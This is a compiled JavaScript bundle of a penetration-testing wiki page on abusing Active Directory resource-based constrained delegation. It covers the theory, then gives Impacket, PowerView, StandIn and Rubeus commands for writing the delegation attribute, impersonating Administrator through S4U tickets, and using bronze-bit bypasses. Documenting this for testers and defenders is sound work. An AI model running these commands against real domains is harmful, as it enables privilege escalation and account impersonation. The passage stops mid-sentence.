import{_ as o}from"./chunks/RBCD mindmap.DIwJW5_9.js";import{_ as c,c as d,a5 as r,G as s,w as a,B as h,o as k,j as e,a as t}from"./chunks/framework.B5CpDqM0.js";const C=JSON.parse('{"title":"(RBCD) Resource-based constrained","description":"","frontmatter":{"authors":"ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/movement/kerberos/delegations/rbcd.md","filePath":"ad/movement/kerberos/delegations/rbcd.md","lastUpdated":1724982529000}'),p={name:"ad/movement/kerberos/delegations/rbcd.md"};function u(g,i,b,m,y,F){const n=h("PluginTabsTab"),l=h("PluginTabs");return k(),d("div",null,[i[4]||(i[4]=r('<h1 id="rbcd-resource-based-constrained" tabindex="-1">(RBCD) Resource-based constrained <a class="header-anchor" href="#rbcd-resource-based-constrained" aria-label="Permalink to &quot;(RBCD) Resource-based constrained&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>If an account, having the capability to edit the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute of another object (e.g. the <code>GenericWrite</code> ACE, see <a href="./../../dacl/">Abusing ACLs</a>), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.</p><div class="tip custom-block"><p>Machine accounts can edit their own <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute, hence allowing RBCD attacks on relayed machine accounts authentications.</p></div><p>For this attack to work, the attacker needs to populate the target attribute with the SID of an account that Kerberos can consider as a service. A service ticket will be asked for it. In short, the account must be either (see <a href="./../#tickets">Kerberos tickets</a> for more information about the following):</p><ul><li>a user account having a <code>ServicePrincipalName</code> set</li><li>an account with a trailing <code>$</code> in the <code>sAMAccountName</code> (i.e. a computer accounts)</li><li>any other account and conduct <a href="./rbcd#rbcd-on-spn-less-users">SPN-less RBCD</a> with <a href="./../#user-to-user-authentication">U2U (User-to-User) authentication</a></li></ul><p>The common way to conduct these attacks is to create a computer account. This is usually possible thanks to a domain-level attribute called <a href="./../../builtins/machineaccountquota"><code>MachineAccountQuota</code></a> that allows regular users to create up to 10 computer accounts.</p><div class="tip custom-block"><p>In 2022, <a href="https://twitter.com/tiraniddo" target="_blank" rel="noreferrer">Jame Forshaw</a> demonstrated that the SPN requirement wasn&#39;t completely mandatory and RBCD could be operated without: <a href="https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html" target="_blank" rel="noreferrer">Exploiting RBCD using a normal user</a>. While this technique is a bit trickier and should absolutely be avoided on regular user accounts (the technique renders them unusable for normal people), it allows to abuse RBCD even if the <a href="./../../builtins/machineaccountquota"><code>MachineAccountQuota</code></a> is set to 0. The technique is demonstrated later on in this page (<a href="./rbcd#rbcd-on-spn-less-users">RBCD on SPN-less user</a>).</p></div><p>Then, in order to abuse this, the attacker has to control the account (A) the target object&#39;s (B) attribute has been populated with. Using that account&#39;s (A) credentials, the attacker can obtain a ticket through <code>S4U2Self</code> and <code>S4U2Proxy</code> requests, just like constrained delegation with protocol transition.</p><p>In the end, an RBCD abuse results in a Service Ticket to authenticate on the target service (B) on behalf of a user. Once the final Service Ticket is obtained, it can be used with <a href="./../ptt">Pass-the-Ticket</a> to access the target service (B).</p><div class="warning custom-block"><p>If the &quot;impersonated&quot; account is &quot;<a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts" target="_blank" rel="noreferrer">is sensitive and cannot be delegated</a>&quot; or a member of the &quot;<a href="https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group" target="_blank" rel="noreferrer">Protected Users</a>&quot; group, the delegation will (probably) fail.</p></div><div class="tip custom-block"><p>Nota bene: the native, RID 500, &quot;Administrator&quot; account doesn&#39;t benefit from that restriction, even if it&#39;s added to the Protected Users group (source: <a href="https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/" target="_blank" rel="noreferrer">sensepost.com</a>).</p></div><div class="note custom-block"><p>There are a few additional details to keep in mind, valid as of the time of writing this note, Jan. 24th 2023.</p><ul><li>In December 2020, along with <a href="https://support.microsoft.com/en-us/topic/kb4598347-managing-deployment-of-kerberos-s4u-changes-for-cve-2020-17049-569d60b7-3267-e2b0-7d9b-e46d770332ab" target="_blank" rel="noreferrer">KB4598347</a> patching the <a href="./bronze-bit">bronze-bit attack</a> (CVE-2020-17049), Microsoft issued <a href="https://support.microsoft.com/en-us/topic/kb4577252-managing-deployment-of-rbcd-protected-user-changes-for-cve-2020-16996-9a59a49f-20b9-a292-f205-da9da0ff24d3" target="_blank" rel="noreferrer">KB4577252</a> patching the CVE-2020-16996 vulnerability. While this second CVE has few information and details about it online, some lab testing indicates it may be linked to the verifications made by KDCs when receiving <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/c6f6f8b3-1209-487b-881d-d0908a413bb7" target="_blank" rel="noreferrer">S4U2proxy <code>TGS-REQ</code></a> requests.</li><li>Before this patch, some testing indicates that accounts set as &quot;sensitive and cannot be delegated&quot; wouldn&#39;t be delegated (intended behavior), but members of the Protected Users group (and without the &quot;sensitive&quot; setting) would be (unintended !).</li><li>As it turns out, even after the patch, as of Jan. 24th 2023, members of the Protected Users group are now in fact protected against delegation, except for the native administrator account (RID 500), even if it&#39;s a member of the group. No idea if this is intended or not but it seems it&#39;s not the only security behavior of that group that doesn&#39;t apply for this account (e.g. RC4 pre-authentication still works for the RID-500 admin, even if member of the Protected Users group, source: <a href="https://twitter.com/Defte_/status/1597699988368556032" target="_blank" rel="noreferrer">Twitter</a>).</li></ul></div><div class="tip custom-block"><p>A technique called <a href="./../ptt#modifying-the-spn">AnySPN or &quot;service class modification&quot;</a> can be used concurrently with pass-the-ticket to change the service class the Service Ticket was destined to (e.g. for the <code>cifs/target.domain.local</code> SPN, the service class is <code>cifs</code>).</p></div><p><img src="'+o+'" alt=""></p><div class="tip custom-block"><p>The <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> was introduced with Windows Server 2012 implying that RBCD only works when the Domain Controller Functionality Level (DCFL) is Windows Server 2012 or higher.</p></div><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2>',17)),s(l,null,{default:a(()=>[s(n,{label:"UNIX-like"},{default:a(()=>i[0]||(i[0]=[e("p",null,[e("strong",null,"Step 1"),t(`: edit the target's "rbcd" attribute (`),e("a",{href:"./../../dacl/"},"DACL abuse"),t(") ✏️")],-1),e("p",null,[e("a",{href:"https://github.com/SecureAuthCorp/impacket/",target:"_blank",rel:"noreferrer"},"Impacket"),t("'s "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py",target:"_blank",rel:"noreferrer"},"rbcd.py"),t(" script (Python) _c_an be used to read, write or clear the delegation rights, using the credentials of a domain user that has the needed permissions.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Read the attribute")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"rbcd.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -delegate-to"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'target$'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainController'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -action"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'read'"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain'/'PowerfulUser':'Password'")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"rbcd.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -delegate-from"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'controlledaccount'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -delegate-to"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'target$'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainController'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -action"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'write'"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain'/'PowerfulUser':'Password'")])])])],-1),e("div",{class:"success custom-block"},[e("p",null,[t("Testers can also use "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py",target:"_blank",rel:"noreferrer"},"ntlmrelayx"),t(" to set the delegation rights with the "),e("code",null,"--delegate-access"),t(" option when conducting this attack from a "),e("a",{href:"./../../ntlm/relay"},"relayed authentication"),t(".")])],-1),e("div",{class:"tip custom-block"},[e("p",null,[t("In this example, "),e("code",null,"controlledaccount"),t(" can be "),e("a",{href:"./../../builtins/machineaccountquota#create-a-computer-account"},"a computer account created for the attack"),t(", or any other account -with at least one Service Principal Name set for the usual technique, or without for "),e("a",{href:"./rbcd#rbcd-on-spn-less-users"},"SPN-less RBCD"),t("- which credentials are known to the attacker.")])],-1),e("hr",null,null,-1),e("p",null,[e("strong",null,"Step 2"),t(": obtain a ticket (delegation operation) 🎫")],-1),e("p",null,[t("Once the attribute has been modified, the "),e("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),t(" script "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py",target:"_blank",rel:"noreferrer"},"getST"),t(' (Python) can then perform all the necessary steps to obtain the final "impersonating" ST (in this case, "Administrator" is impersonated but it can be any user in the environment).')],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"getST.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -spn"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'cifs/target'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -impersonate"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," Administrator"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainController'"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain/controlledaccountwithSPN:SomePassword'")])])])],-1),e("div",{class:"caution custom-block"},[e("p",null,[t("In "),e("a",{href:"./#theory"},"some cases"),t(", the delegation will not work. Depending on the context, the "),e("a",{href:"./bronze-bit"},"bronze bit "),t("vulnerability (CVE-2020-17049) can be used with the "),e("code",null,"-force-forwardable"),t(" option to try to bypass restrictions.")])],-1),e("div",{class:"tip custom-block"},[e("p",null,[t("The SPN (Service Principal Name) set can have an impact on what services will be reachable. For instance, "),e("code",null,"cifs/target.domain"),t(" or "),e("code",null,"host/target.domain"),t(" will allow most remote dumping operations (more info on "),e("a",{href:"https://adsecurity.org/?page_id=183",target:"_blank",rel:"noreferrer"},"adsecurity.org"),t("). There however scenarios where the SPN can be changed ("),e("a",{href:"./../ptt#modifying-the-spn"},"AnySPN"),t(") to access more service. This technique is automatically tried by Impacket scripts when doing pass-the-ticket.")])],-1),e("hr",null,null,-1),e("p",null,[e("strong",null,"Step 3"),t(": Pass-the-ticket 🛂")],-1),e("p",null,[t("Once the ticket is obtained, it can be used with "),e("a",{href:"./../ptt"},"pass-the-ticket"),t(".")],-1)])),_:1}),s(n,{label:"Windows"},{default:a(()=>i[1]||(i[1]=[e("p",null,[t("In order to run the following commands and tools as other users, testers can check the "),e("a",{href:"./../../credentials/impersonation"},"user impersonation"),t(" part.")],-1),e("p",null,[e("strong",null,"Step 1"),t(`: edit the target's "rbcd" attribute (`),e("a",{href:"./../../dacl/"},"DACL abuse"),t(") ✏️")],-1),e("p",null,[t("The "),e("a",{href:"https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps",target:"_blank",rel:"noreferrer"},"PowerShell ActiveDirectory module"),t("'s cmdlets Set-ADComputer and Get-ADComputer can be used to write and read the attributed of an object (in this case, to modify the delegation rights).")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Read the security descriptor")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Get-ADComputer"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $targetComputer "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-Properties"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," PrincipalsAllowedToDelegateToAccount")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Populate the msDS-AllowedToActOnBehalfOfOtherIdentity")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Set-ADComputer"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $targetComputer "),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-PrincipalsAllowedToDelegateToAccount"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'controlledaccountwithSPN'")])])])],-1),e("p",null,[t("PowerSploit's "),e("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1",target:"_blank",rel:"noreferrer"},"PowerView"),t(" module is an alternative that can be used to edit the attribute ("),e("a",{href:"https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/",target:"_blank",rel:"noreferrer"},"source"),t(").")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Obtain the SID of the controlled account with SPN (e.g. Computer account)")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ComputerSid = Get-DomainComputer "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"controlledaccountwithSPN"'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," -Properties objectsid "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"|"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," Select"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Expand"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," objectsid")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$('),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ComputerSid"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'))"')]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$SDBytes = New-Object byte[] ($SD.BinaryLength)")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$SD.GetBinaryForm($SDBytes, 0)")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# set SD in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the target comptuer account")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Get-DomainComputer"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "target$"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," |"),e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}}," Set-DomainObject"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Set"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," @{'msds-allowedtoactonbehalfofotheridentity'="),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$SDBytes"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"}")])])])],-1),e("p",null,[t("FuzzSecurity's "),e("a",{href:"https://github.com/FuzzySecurity/StandIn",target:"_blank",rel:"noreferrer"},"StandIn"),t(" project is another alternative in C# (.NET assembly) to edit the attribute ("),e("a",{href:"https://github.com/FuzzySecurity/StandIn#add-msds-allowedtoactonbehalfofotheridentity",target:"_blank",rel:"noreferrer"},"source"),t(").")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Obtain the SID of the controlled account with SPN (e.g. Computer account)")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"StandIn.exe"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," --"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"object samaccountname"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"controlledaccountwithSPNName")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Add the object to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computer")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"StandIn.exe"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," --"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"computer "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"target"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," --"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"sid "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},`"controlledaccountwithSPN's SID"`)])])])],-1),e("hr",null,null,-1),e("p",null,[e("strong",null,"Step 2"),t(": obtain a ticket (delegation operation) 🎫")],-1),e("p",null,[e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),t(' can then be used to request the TGT and "impersonation ST", and inject it for later use.')],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Request a TGT for the current user")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," tgtdeleg "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nowrap")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# OR - Request a TGT for a specific account")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," asktgt "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"controlledaccountwithSPN"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"aes256:$aesKey "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nowrap")]),t(`
`),e("span",{class:"line"}),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},'# Request the "impersonation" service ticket using RC4 Key')]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," s4u "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nowrap "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"impersonateuser:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"administrator"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"msdsspn:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"cifs/target"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"controlledaccountwithSPN"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"rc4:$NThash")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},'# OR - Request the "impersonation" service ticket using TGT Ticket of the controlledaccountwithSPN')]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," s4u "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nowrap "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"impersonateuser:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"administrator"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"msdsspn:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"host/target"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"altservice:cifs"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},","),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ldap "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"controlledaccountwithSPN"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ticket:$kirbiB64tgt")])])])],-1),e("p",null,"The NT hash and AES keys can be computed as follows.",-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," hash "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"password:$password")]),t(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," hash "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:$username "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain.local"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"password:$password")])])])],-1),e("div",{class:"caution custom-block"},[e("p",null,[t("In "),e("a",{href:"./#theory"},"some cases"),t(", the delegation will not work. Depending on the context, the "),e("a",{href:"./bronze-bit"},"bronze bit "),t("vulnerability (CVE-2020-17049) can be used with the "),e("code",null,"/bronzebit"),t(" flag to try to bypass restrictions.")])],-1),e("div",{class:"tip custom-block"},[e("p",null,[t("The SPN (Service Principal Name) set can have an impact on what services will be reachable. For instance, "),e("code",null,"cifs/target.domain"),t(" or "),e("code",null,"host/target.domain"),t(" will allow most remote dumping operations (more info on "),e("a",{href:"https://adsecurity.org/?page_id=183",target:"_blank",rel:"noreferrer"},"adsecurity.org"),t("). There however scenarios where the SPN can be changed ("),e("a",{href:"./../ptt#modifying-the-spn"},"AnySPN"),t(") to access more services. This technique can be exploited with the "),e("code",null,"/altservice"),t(" flag with 